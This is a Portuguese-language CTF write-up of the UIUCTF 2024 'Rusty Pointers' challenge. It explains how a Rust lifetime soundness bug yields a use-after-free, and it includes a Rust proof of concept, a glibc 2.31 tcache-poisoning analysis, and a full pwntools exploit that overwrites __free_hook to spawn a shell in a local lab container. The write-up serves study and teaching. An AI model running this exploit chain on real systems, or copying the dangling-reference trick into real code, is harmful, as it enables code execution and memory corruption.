## Write-Up — UIUCTF 2024: Rusty Pointers (Repositório do Projeto e Exploração Completa)
O desafio Rusty Pointers, apresentado no UIUCTF 2024 com dificuldade média-difícil e 36 resoluções registradas durante a competição, demonstra que a ausência de blocos unsafe em um programa Rust não garante imunidade contra corrupção de memória quando o próprio verificador de tipos do compilador apresenta falhas de soundness. Implementado como um sistema de gerenciamento de horários de trem com operações sobre Rules, Notes e Laws, o binário explora um bug histórico de inferência e variância de lifetimes em higher-ranked trait bounds (documentado como Issue #25860 no repositório oficial do Rust) para gerar uma referência mutável dangling em código 100% seguro. Como a estrutura Box utiliza o alocador padrão do sistema no Linux (glibc malloc), essa falha semântica no compilador traduz-se diretamente em uma vulnerabilidade clássica de Use-After-Free (UAF) na heap, permitindo tcache poisoning na glibc 2.31 e execução arbitrária de comandos para leitura da flag. Este documento consolida a análise técnica do desafio a partir dos artefatos reunidos no repositório Proceed15/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao: a organização do projeto, o isolamento do ambiente alvo, a explicação formal do furo de lifetimes, a minimização e demonstração isolada da referência dangling, o mapeamento das primitivas de heap e o registro completo das iterações de depuração até a captura da flag.
1. Arquitetura do Repositório e Isolamento do Ambiente Alvo
A reprodução fiel de vulnerabilidades que dependem simultaneamente de comportamento específico do compilador e de mecânicas internas do alocador exige tanto a preservação organizada dos artefatos de build quanto o alinhamento estrito das versões de toolchain e biblioteca C. O repositório público Proceed15/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao centraliza os arquivos do desafio original, a documentação de suporte e as transcrições completas da validação em laboratório.
1.1. Estrutura e Artefatos do Repositório do Projeto
Mantido sob licença MIT na branch main (com histórico de 3 commits, evoluindo do Initial commit 6ffeb4c até o commit final da6aada, intitulado "Desafio Concluído", com autoria atribuída nos registros do GitHub a Proceed15 / José Lisboa Filho), o repositório apresenta composição majoritariamente em Rust (63,5%) e Python (25,8%), complementada por Dockerfile (6,4%) e Shell (4,3%). Cada componente na raiz do projeto desempenha um papel específico na reprodução do ambiente e na auditoria do exploit.
A tabela a seguir sintetiza a organização dos arquivos e diretórios mantidos no repositório Proceed15/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao.
Caminho no Repositório
Tipo
Último Marco Registrado
Função Técnica no Projeto
rusty-pointers/
Diretório
da6aada (Desafio Concluído)
Reúne os arquivos do desafio (challenge/dist/Dockerfile, challenge/dist/libc-2.31.so, binário rusty_ptrs, SOLVE.md, challenge.yaml, healthcheck/ e solve.py).
Desafio Rusty-Pointer Doc Concluido.txt
Log de Execução
da6aada (Desafio Concluído)
Registra a transcrição integral do terminal dentro do container e do host WSL2, incluindo PoC em Rust, falhas intermediárias e a captura final da flag.
hints.md
Documentação Técnica
da6aada (Desafio Concluído)
Reúne estratégia de engenharia reversa, caminho de resolução estabilizado e diagnóstico da instabilidade da abordagem original com duas Notes.
README.md
Documentação
6ffeb4c (Initial commit)
Apresenta a descrição inicial do repositório de cibersegurança voltado ao desafio e à apresentação.
LICENSE e .gitignore
Metadados
6ffeb4c (Initial commit)
Definem a licença MIT do repositório e as regras de exclusão de artefatos locais temporários.
A separação entre os arquivos originais do desafio dentro de rusty-pointers/ e os registros de validação na raiz preserva intacto o solve.py de referência enquanto documenta de forma rastreável as adaptações locais (solve_local.py) necessárias para executar a exploração fora da infraestrutura original de competição.
1.2. Contraste Host vs. Container e Perfil de Mitigações do Binário
Em sistemas modernos baseados em Ubuntu 24.04 (noble), o ambiente host apresenta divergências críticas em relação ao alvo original do desafio: versões recentes do rustc (como 1.98.1, observado no host WSL2 durante as verificações iniciais, e 1.99, mencionado nas notas de referência do desafio) já rejeitam ou alteram a aceitação do padrão de lifetimes da Issue #25860, enquanto bibliotecas glibc a partir da versão 2.32 introduzem proteções como safe-linking, ofuscando os ponteiros armazenados na tcache em comparação à glibc 2.31. Além disso, a política PEP 668 (externally-managed-environment) no Python 3.12 bloqueia instalações globais via pip, exigindo o isolamento do pwntools 4.15.0 dentro de um ambiente virtual dedicado (.venv).
A tabela abaixo contrasta o ambiente host moderno com o container isolado construído a partir de challenge/dist/Dockerfile e validado em Desafio Rusty-Pointer Doc Concluido.txt.
Componente
Ambiente Host (Ubuntu 24.04 WSL2)
Container Alvo (rusty-pointers-dist)
Impacto na Exploração
Sistema Base
Ubuntu 24.04 LTS (noble)
Ubuntu 20.04 LTS (container fe371b477eb1)
Define versões padrão de pacotes e bibliotecas do sistema.
Compilador Rust
rustc 1.98.1 (2026-09-01)
rustc 1.75.0 (82e1608df 2023-12-21, compilado de source tarball)
rustc 1.75.0 compila o furo de lifetimes da Issue #25860; versões novas como 1.99 o rejeitam.
Biblioteca C (glibc)
2.39-0ubuntu8.9
2.31-0ubuntu9.17
glibc 2.31 não possui safe-linking (introduzida na 2.32) e mantém __free_hook acessível.
Ferramental Python
Python 3.12.3 + .venv (pwntools 4.15.0)
Serviço exposto via socat na porta 1337 (usuário pwn)
.venv contorna a proteção PEP 668 para execução limpa do exploit.
Conforme registrado na construção da imagem e na inspeção interativa dentro do container, rusty-pointers-dist parte de ubuntu:20.04, instala curl, socat e cargo via apt-get, compila o projeto em /usr/src/pwn/rusty_ptrs com cargo b, copia flag.txt com permissão 444 sob o usuário pwn e expõe o binário na porta 1337. Ao verificar a versão do compilador dentro do container (rustc --version), o sufixo (built from a source tarball) apenas indica que o compilador foi construído pelos mantenedores do Ubuntu a partir do pacote de código-fonte oficial da versão 1.75.0, sem alterar a semântica do borrow checker. Diferentemente do Dockerfile oficial baseado em kCTF (que inclui nsjail, Proof-of-Work e flags privilegiadas), esse container local preserva integralmente o binário ELF64 dinamicamente linkado e mantém exata correspondência de offsets com ./challenge/dist/libc-2.31.so.
Os comandos e saídas a seguir registram a construção, inicialização, validação interna de versões no container e verificação inicial do serviço pela porta local 1337:
sudo docker build -t rusty-pointers-dist -f challenge/dist/Dockerfile challenge
sudo docker run -d --name rusty-pointers-dist -p 1337:1337 rusty-pointers-dist
sudo docker exec -it rusty-pointers-dist bash
pwn@fe371b477eb1:/usr/src/pwn$ rustc --version
rustc 1.75.0 (82e1608df 2023-12-21) (built from a source tarball)
pwn@fe371b477eb1:/usr/src/pwn$ ldd --version
ldd (Ubuntu GLIBC 2.31-0ubuntu9.17) 2.31
Na conexão de teste com nc 127.0.0.1 1337, o serviço respondeu imediatamente com o menu completo de seis operações do gerenciador de horários (1. Create a Rule or Note, 2. Delete a Rule or Note, 3. Read a Rule or Note, 4. Edit a Rule or Note, 5. Make a Law, 6. Exit), enquanto a análise automática do binário pelo pwntools confirmou todas as proteções padrão ativas na arquitetura amd64-64-little: RELRO: Partial RELRO, Stack: Canary found, NX: NX enabled, PIE: PIE enabled, SHSTK: Enabled e IBT: Enabled. Com o serviço validado e as mitigações de pilha e código mapeadas, a investigação volta-se para a falha no sistema de tipos que permite corromper a heap.
2. Causa Raiz no Sistema de Tipos: Quebrando o Borrow Checker via Issue #25860 sem unsafe
Para compreender como um código Rust sem qualquer bloco unsafe produz um ponteiro pendente (dangling), é necessário examinar primeiro o contrato normal de segurança de memória da linguagem e, em seguida, o ponto exato em que a inferência de tipos falha em preservá-lo.
2.1. O Modelo de Ownership, Lifetimes e a Ponte para a Heap do Sistema
Em Rust seguro, a segurança de memória em tempo de compilação apoia-se em dois pilares complementares: Ownership e Lifetimes. Pelo modelo de Ownership, todo valor alocado possui um único dono responsável por liberar sua memória assim que sai de escopo; pelo modelo de Lifetimes, quando um valor com duração 'a é emprestado a uma referência com duração 'b, o compilador exige que o dado original sobreviva à referência (ou seja, 'a precisa ser ao menos tão longo quanto 'b). No código-fonte simplificado do desafio (main.rs), conforme detalhado pelo autor Sam Ruggerio, o programa mantém dois vetores distintos sobre buffers de tamanho LEN = 64 bytes: RulesT e NotesT.
const LEN: usize = 64;
type RulesT = Vec<&'static mut [u8; LEN]>;
type NotesT = Vec<Box<[u8; LEN]>>;

fn create_rule(rules: &mut RulesT){
	let buf = get_rule();
	rules.push(buf);
	println!("Rule Created!");
}

fn create_note(notes: &mut NotesT){
	let buf = get_note();
	notes.push(buf);
	println!("Note Created!");
}

fn get_rule() -> &'static mut [u8; LEN] {
	let mut buffer = Box::new([0; LEN]);
	return get_ptr(&mut buffer);
}

fn get_note() -> Box<[u8; LEN]>{
	return Box::new([0; LEN])
}
A assimetria entre essas duas funções define toda a superfície de ataque do binário. Enquanto get_note() retorna diretamente um Box::new([0; LEN]) — transferindo a posse da alocação para o vetor notes, onde há verificação de limites (bounds checking) que impede ler, editar ou remover uma Note após sua exclusão —, get_rule() aloca um Box<[u8; 64]> localmente, obtém uma referência mutável para ele e a passa para get_ptr(&mut buffer) antes de retornar &'static mut [u8; 64]. Como o programa não especifica um alocador customizado, Box utiliza o alocador padrão do sistema no Linux (glibc malloc e free). Consequentemente, assim que get_rule() termina e sua variável local buffer sai de escopo, o Box é desalocado pela glibc, devolvendo o bloco à heap, ao mesmo tempo em que rules.push(buf) armazena uma referência &'static mut para esse mesmo endereço agora livre — permitindo que uma Rule vaze metadados da heap ou ecoe o conteúdo de uma Note alocada posteriormente.
2.2. Anatomia de get_ptr: Constante Estática, Testemunha e Inferência de Ponteiro de Função
A função responsável por essa conversão ilegítima de lifetime encontra-se em main.rs (linha 83, segundo as notas técnicas do desafio) e resume-se a três componentes sintáticos que reproduzem o padrão popularizado pelo projeto cve-rs. A listagem a seguir reproduz a implementação de get_ptr no binário vulnerável.
const S: &&() = &&();

#[inline(never)]
fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    fn ident<'a, 'b, T: ?Sized>(
        _val_a: &'a &'b (),
        val_b: &'b mut T,
    ) -> &'a mut T {
        val_b
    }
    let f: fn(_, &'a mut T) -> &'b mut T = ident;
    f(S, x)
}
Na análise estrutural apresentada pelo autor do desafio em paralelo ao padrão do cve-rs — no qual os mesmos três blocos aparecem com os nomes STATIC_UNIT, lifetime_expansion e expand_reference —, cada elemento desempenha um papel preciso para contornar o borrow checker:
A constante estática (S / STATIC_UNIT): A declaração const S: &&() = &&(); equivale explicitamente a const STATIC_UNIT: &'static &'static () = &'static &'static ();. Por ser definida fora de qualquer função sobre o tipo unitário (), ambos os empréstimos recebem duração 'static, o que é válido porque o empréstimo interno ('static) sobrevive ao externo ('static).
A função auxiliar com testemunha (witness) (ident / lifetime_expansion): Isoladamente, ident também é inteiramente segura. Sua assinatura recebe _val_a: &'a &'b () (a testemunha) e val_b: &'b mut T, retornando &'a mut T. Para que uma referência do tipo &'a &'b () possa existir na linguagem, o empréstimo interno 'b tem obrigatoriamente de sobreviver ao empréstimo externo 'a. Esse argumento comprova ao compilador que encurtar val_b de 'b para 'a não invalida a memória.
O contorno na inferência do ponteiro de função (f / local_fn): Se get_ptr chamasse ident(S, x) diretamente — ou tipasse o ponteiro local explicitamente como fn(&'b &'a (), &'a mut T) -> &'b mut T —, o compilador rejeitaria o código imediatamente, pois saberia que 'a (o lifetime de x) pode ser mais curto que 'b (o lifetime do retorno). Como toda referência &'static &'static () é aceita onde se espera um &'b &'a (), declarar let f: fn(_, &'a mut T) -> &'b mut T = ident; (ou explicitamente fn(&'static &'static (), &'a mut T) -> &'b mut T) e passar S em f(S, x) faz o compilador inferir o primeiro argumento como &'static &'static (), desvinculando a relação genérica entre 'a e 'b.
Com essa quebra de variância em higher-ranked trait bounds (Issue #25860), o verificador de tipos passa a aceitar a expansão de uma referência de qualquer lifetime 'a para qualquer lifetime 'b — inclusive 'static — permitindo que get_rule() e get_law() entreguem referências tratadas como eternas para blocos já liberados pelo Box.
3. Minimização do Bug de Soundness e Demonstração da Referência Dangling
Seguindo a diretriz de validar o defeito do compilador de forma isolada antes de atacar a heap do serviço, o comportamento foi reduzido a um programa mínimo autônomo (/tmp/poc_uaf.rs) e compilado diretamente dentro do container rusty-pointers-dist com o rustc 1.75.0 e a glibc 2.31, conforme documentado em Desafio Rusty-Pointer Doc Concluido.txt. O código reduz o problema exclusivamente à constante S, às funções get_ptr/ident, a get_rule() e a duas operações sequenciais em main().
const LEN: usize = 64;
const S: &&() = &&();

#[inline(never)]
fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    fn ident<'a, 'b, T: ?Sized>(
        _val_a: &'a &'b (),
        val_b: &'b mut T,
    ) -> &'a mut T {
        val_b
    }
    let f: fn(_, &'a mut T) -> &'b mut T = ident;
    f(S, x)
}

#[inline(never)]
fn get_rule() -> &'static mut [u8; LEN] {
    let mut buffer = Box::new([0; LEN]);
    return get_ptr(&mut buffer);
}

fn main() {
    let dangling = get_rule();
    println!("Apos drop do Box (heap livre): {:x?}", &dangling[..16]);

    let _nova_alocacao = Box::new([0x41u8; LEN]);
    println!("Apos nova alocacao de 64 bytes: {:x?}", &dangling[..16]);
}
A compilação e execução dessa prova de conceito dentro do container (rustc /tmp/poc_uaf.rs -o /tmp/poc_uaf && /tmp/poc_uaf) confirmaram o UAF sem nenhuma linha unsafe:
Apos drop do Box (heap livre): [0, 0, 0, 0, 0, 0, 0, 0, 10, 40, 6e, 5c, 3e, 63, 0, 0]
Apos nova alocacao de 64 bytes: [41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41, 41]
Na primeira linha de saída, logo após get_rule() retornar e o Box de 64 bytes sofrer drop, a referência dangling lê diretamente os 16 primeiros bytes reservados pela tcache da glibc 2.31 para os campos next e key: os 8 bytes iniciais permanecem zerados (sem próximo bloco livre na lista) e os 8 bytes seguintes (10, 40, 6e, 5c, 3e, 63, 0, 0) expõem em formato plano o metadado gravado pelo alocador, sem qualquer ofuscação por safe-linking. Na segunda linha, a criação de _nova_alocacao com Box::new([0x41u8; 64]) solicita um chunk da mesma classe de tamanho na tcache (que opera em regime LIFO), reutiliza exatamente a região ainda referenciada por dangling e passa a ecoar os bytes 0x41. Esse mesmo mecanismo explica por que, no binário do desafio, uma Rule lê metadados de heap quando alocada isoladamente e reflete o conteúdo de uma Note criada na sequência.
4. Arquitetura da Heap na glibc 2.31 e Construção das Primitivas
A passagem da referência dangling para controle arbitrário de memória exige mapear como as estruturas do programa interagem com as listas de blocos livres (bins) do alocador ptmalloc2 na glibc 2.31.
4.1. Mapeamento de Classes de Tamanho (0x50 vs. 0x7e0)
No binário do desafio, todas as operações disponíveis no menu principal manipulam apenas duas classes de tamanho de alocação na heap, cuja distinção determina em qual estrutura interna da glibc os blocos liberados são armazenados. A tabela abaixo resume o comportamento de cada operação.
Operação no Menu
Estrutura Rust
Tamanho de Usuário
Tamanho do Chunk (glibc)
Destino após Liberação
Comportamento da Referência
Create Rule (1 → 1)
Box<[u8; 64]> via get_rule()
64 bytes
0x50
tcache (bucket 0x50)
Armazena &'static mut [u8; 64] dangling em rules.
Create Note (1 → 2)
Box<[u8; 64]> via get_note()
64 bytes
0x50
tcache (bucket 0x50) apenas em Delete Note
Mantém propriedade real em notes (sem UAF até ser deletada).
Make a Law (5)
Buffers temporários via get_law()
2000 bytes
0x7e0
unsorted bin
Aloca dois buffers de 2000 bytes, libera o primeiro, realoca via get_law() e lê os 16 bytes iniciais em hex.
Como Rules e Notes solicitam exatamente 64 bytes, somados aos metadados de cabeçalho do chunk na glibc, ambas compartilham o bucket 0x50 da tcache — uma estrutura Last-In, First-Out (LIFO) por thread que armazena até 7 blocos livres por tamanho e grava os ponteiros next e key nos primeiros 16 bytes. Em contraste, os buffers de 2000 bytes da opção Make a Law resultam em chunks de 0x7e0 bytes, pertencentes a uma classe distinta e grandes o suficiente para ingressar na unsorted bin, cuja lista duplamente ligada armazena os ponteiros fd e bk apontando para a estrutura main_arena dentro da libc.
4.2. As Três Primitivas de Exploração
A combinação entre as operações de Rule, Note e Make a Law fornece três primitivas encadeáveis:
Vazamento determinístico da libc: Segundo a análise em hints.md e nas notas técnicas do desafio, a opção 5 (Make a Law) aloca dois buffers de 2000 bytes, libera o primeiro na unsorted bin, chama get_law() (que aloca e libera o bloco de 2000 bytes no mesmo espaço via get_ptr) e imprime imediatamente os primeiros 16 bytes em formato hexadecimal. Como o bloco passou pela unsorted bin, esses valores correspondem a fd e bk apontando para &main_arena.bins[0] dentro da libc, eliminando a necessidade de técnicas complexas de vazamento prévio.
Sobreposição controlada (Overlap) entre Rule e Note: Como get_rule() aloca e imediatamente libera um chunk de 0x50, a referência resultante aponta para o bloco no topo da tcache desse tamanho. Qualquer Note alocada na sequência obtém exatamente esse bloco, fazendo com que a escrita ou leitura por meio da Rule opere sobre o conteúdo ativo da Note.
Envenenamento da tcache (Tcache Poisoning) sem safe-linking: Na glibc 2.31, os ponteiros next (fd) armazenados na tcache permanecem em texto claro na memória (a proteção safe-linking só foi introduzida na glibc 2.32). Editar uma Rule cuja referência aponta para um chunk livre na tcache sobrescreve diretamente seu ponteiro next com um endereço arbitrário de destino — no caso, __free_hook, que é invocado pela glibc sempre que free() recebe um ponteiro não nulo.
Um detalhe crítico de implementação no alocador da glibc 2.31 governa a contagem de blocos livres antes do envenenamento: conforme destacado em WRITEUP (1).md, a função interna tcache_get decrementa um contador de entradas disponíveis no bucket a cada alocação e interrompe a consulta à lista ligada caso esse contador atinja zero. Portanto, manter múltiplas entradas livres na tcache (0x50) antes de criar e editar a Rule garante que o contador permaneça positivo quando o ponteiro envenenado alcançar o topo da lista, preparando o caminho determinístico para o exploit completo.
5. Cadeia de Exploração, Troubleshooting Documentado e Captura da Flag
Com as primitivas estabelecidas, a exploração completa calcula dinamicamente a base da libc para contornar o ASLR e orquestra a fila da tcache para redirecionar __free_hook para system("/bin/sh"). O registro completo em Desafio Rusty-Pointer Doc Concluido.txt, versionado no repositório Proceed15/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao, documenta tanto a medição matemática dos endereços quanto o ciclo real de depuração até a captura bem-sucedida da flag.
5.1. Cálculo Determinístico da Base e Símbolos Alvo
Embora o ASLR randomize o endereço base da libc a cada execução, a distância relativa (offset) entre o ponteiro vazado de main_arena e o início do mapeamento da biblioteca permanece constante. Conforme documentado em WRITEUP (1).md, esse offset pode ser medido executando o binário local e comparando o retorno da opção 5 com o mapeamento real da libc em /proc/<pid>/maps via p.libs() do pwntools:
p = process(BIN, cwd=CHAL)
p.recvuntil(b'> '); p.sendline(b'5')
leak = int(p.recvline().split(b',')[0], 16)
base = [b for k, b in p.libs().items() if 'libc' in k][0]
print(hex(leak - base))        # 0x1ecbe0
Para o arquivo libc-2.31.so distribuído no desafio, o offset medido entre o vazamento retornado por Make a Law e a base da libc é 0x1ecbe0. Na prática, toda execução confirma duas invariantes: o endereço vazado termina sempre em 0xbe0 e o resultado da subtração (leak - 0x1ecbe0) & 0xfff é igual a 0 (alinhamento de página). Uma vez obtida libc.address, o pwntools resolve dinamicamente os endereços exatos de __free_hook e system a partir da tabela de símbolos do arquivo ./challenge/dist/libc-2.31.so carregado pelo exploit — operação que, na validação contra o container local registrada em Desafio Rusty-Pointer Doc Concluido.txt, calculou libc base: 0x7a4cc7a8a000 e __free_hook: 0x7a4cc7c78e48.
5.2. Histórico de Iteração e Estabilização no Laboratório
A análise de Desafio Rusty-Pointer Doc Concluido.txt e hints.md evidencia três iterações práticas antes da estabilização do exploit contra 127.0.0.1:1337:
Adaptação direta do solve.py original (Got EOF e BytesWarning): Na primeira tentativa, solve.py foi copiado para solve_local.py substituindo apenas o destino remoto por 127.0.0.1:1337. Embora o script tenha calculado corretamente a base da libc (0x7a4cc7a8a000) e __free_hook (0x7a4cc7c78e48), emitiu BytesWarning na linha 87 (p.sendline(dat) recebendo str) e encerrou com [*] Got EOF while reading in interactive. Conforme explicado em hints.md, liberar apenas duas Notes antes de make_rule() deixa o estado da tcache (0x50) instável, impedindo o alinhamento confiável da segunda alocação sobre __free_hook, além de o script depender da liberação implícita de um buffer temporário em Rust sem chamar del_note(0) explicitamente.
Truncamento de colagem e TypeError na leitura do leak: Na segunda tentativa de reescrever solve_local.py diretamente pelo terminal WSL2, o fluxo de entrada foi truncado no meio do arquivo e, após edição parcial, apresentou TypeError: int() can't convert non-string with explicit base na linha 57, porque p.recvline().decode().split(", ") retornava uma lista em vez de string hexadecimal.
Modularização e estabilização conforme hints.md: Na terceira iteração, o script foi gravado de forma íntegra em cinco blocos sequenciais via heredoc (cat << 'EOF' > / >> solve_local.py), validado com tail -n 5 solve_local.py e construído com os ajustes de estabilidade: leitura direta do hexadecimal até a vírgula via io.recvuntil(b",", drop=True), preparação da tcache (0x50) com 4 Notes liberadas em ordem decrescente (3, 2, 1, 0), preenchimento exato dos 64 bytes em formato bytes com io.sendafter(b"> ", data.ljust(64, b"\x00")) e disparo explícito de delete_note(0) ao final.
A tabela abaixo detalha passo a passo o estado da heap ao longo da cadeia estabilizada:
Passo
Operação Executada
Efeito no Estado da Heap (tcache[0x50] / unsorted bin)
Resultado Obtido
1
make_law() (opção 5)
Aloca e libera buffer de 0x7e0 na unsorted bin; lê ponteiro de main_arena.
Calcula base da libc (leak - 0x1ecbe0), __free_hook e system.
2
4 × create_note(), depois delete_note(3..0)
Popula tcache[0x50] com quatro chunks livres (Chunk 0 -> Chunk 1 -> Chunk 2 -> Chunk 3), contador = 4.
Prepara a lista LIFO de forma estável para reutilização.
3
create_rule()
Retira Chunk 0 da tcache e o devolve no retorno de get_rule(); contador volta a 4, lista começa em Chunk 0.
rules[0] retém referência &'static mut dangling para Chunk 0.
4
edit_rule(0, p64(free_hook))
Sobrescreve os 8 primeiros bytes (next) de Chunk 0 livre com o endereço de __free_hook.
Lista da tcache passa a ser Chunk 0 -> __free_hook.
5
2 × create_note()
Primeira Note (notes[0]) consome Chunk 0; segunda Note (notes[1]) é alocada diretamente em __free_hook.
Primitiva de escrita arbitrária sobre __free_hook.
6
edit_note(1, p64(system)) e edit_note(0, b"/bin/sh\x00")
Grava o endereço de system dentro de __free_hook e a string de comando na memória apontada por notes[0].
Gatilho armado para execução ao próximo free().
7
delete_note(0)
Box<[u8; 64]> de notes[0] é liberado via free(notes[0]), desviado para __free_hook(notes[0]).
Executa system("/bin/sh"), abrindo shell no container.
O script final validado contra 127.0.0.1:1337, exatamente como registrado no fechamento de Desafio Rusty-Pointer Doc Concluido.txt, está reproduzido abaixo:
#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 1337
libc = ELF("./challenge/dist/libc-2.31.so")
io = remote(HOST, PORT)

def create_rule():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"1")

def create_note():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"2")

def delete_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())

def edit_rule(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendafter(b"> ", data.ljust(64, b"\x00"))

def edit_note(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendafter(b"> ", data.ljust(64, b"\x00"))

def make_law():
    io.sendlineafter(b"> ", b"5")
    return int(io.recvuntil(b",", drop=True), 16)

libc_leak = make_law()
libc.address = libc_leak - 0x1ecbe0
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

for _ in range(4):
    create_note()
delete_note(3)
delete_note(2)
delete_note(1)
delete_note(0)

create_rule()
edit_rule(0, p64(free_hook))
create_note()
create_note()
edit_note(1, p64(system))
edit_note(0, b"/bin/sh\x00")
delete_note(0)
io.sendline(b"cat flag.txt")
io.interactive()
Ao executar .venv/bin/python solve_local.py, o pwntools carregou a biblioteca alvo, abriu o shell interativo no container e imprimiu imediatamente a flag oficial do desafio antes do encerramento da sessão:
[*] '/home/MainUser/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao/rusty-pointers/challenge/dist/libc-2.31.so'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 127.0.0.1 on port 1337: Done
[*] Switching to interactive mode
uiuctf{who_knew_if_my_pointers_lived_forever_they_would_rust???}[*] Got EOF while reading in interactive
6. Vetores Alternativos, Mitigações em Versões Modernas e Lições de Segurança
Além do caminho clássico via tcache poisoning em __free_hook, as observações pós-competição do autor Sam Ruggerio destacam uma rota alternativa que independe da manipulação direta de hooks da glibc 2.31 e evidencia o contraste entre gerações de compiladores e bibliotecas do sistema.
Realocação de Vec sem limite de capacidade: Como os vetores rules e notes crescem dinamicamente sem teto de capacidade, é possível explorar o crescimento do Vec para fazê-lo realocar seu buffer de metadados sobre uma região controlada por uma Rule pendente. Ao controlar diretamente os ponteiros e metadados do vetor realocado, obtém-se leitura e escrita arbitrárias em memória.
Impacto de versões mais novas do sistema (Ubuntu 22.04 e superiores): Conforme analisado pelo autor ao considerar uma variante do desafio em Ubuntu 22.04, a presença do safe-linking exige lidar com a ofuscação de ponteiros na tcache e leva a alvos alternativos como __exit_funcs para obter um shell. Nesse cenário, a exigência do Rust de inicializar toda memória antes do uso sobrescreve o conteúdo pré-existente ao criar novos buffers, impedindo um vazamento trivial do ponteiro _dl_fini (que é protegido por uma chave aleatória); ainda assim, a técnica baseada na realocação controlada do Vec permanece funcional em Ubuntu 22.04.
Mitigação na camada do compilador: Embora a Issue #25860 tenha permanecido aberta por mais de nove anos no ecossistema Rust, versões recentes do compilador (como rustc 1.99, documentado em WRITEUP (1).md) já rejeitam o padrão de coerção de get_ptr. A lição central de engenharia de segurança — agora consolidada de ponta a ponta no repositório Proceed15/Ciberseguranca_Rust_Pointers_Rusty_ComApresentacao — é que garantias de memory safety em tempo de compilação dependem da integridade formal (soundness) do verificador de tipos e dos limites impostos pelo alocador subjacente: manter toolchains atualizados e utilizar bibliotecas C modernas com endurecimento de heap reduz simultaneamente a superfície de falhas semânticas do compilador e o impacto caso uma referência dangling venha a ocorrer.